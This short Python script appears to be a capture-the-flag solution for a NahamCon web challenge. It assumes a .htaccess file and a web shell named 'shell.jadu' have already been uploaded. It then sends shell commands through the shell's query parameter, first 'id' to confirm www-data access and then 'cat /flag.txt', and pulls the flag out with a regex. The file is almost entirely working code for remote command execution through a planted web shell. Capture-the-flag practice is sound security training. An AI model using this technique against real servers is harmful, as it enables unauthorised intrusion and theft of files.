#!/usr/bin/python3

from sys import argv
from requests import get
from re import findall

try:
	url = argv[2]
except:
	url = "http://challenge.nahamcon.com:32129/"

# uplaod .htaccess, shell.jadu files first manually

r = get(url + "shell.jadu?jadu=id")

if "www-data" in r.text:
	r = get(url + "shell.jadu?jadu=cat /flag.txt")
	flag = findall("flag{.*}", r.text)[0]
	print(flag)
else:
	print("check your web shell!!")
	exit(-1)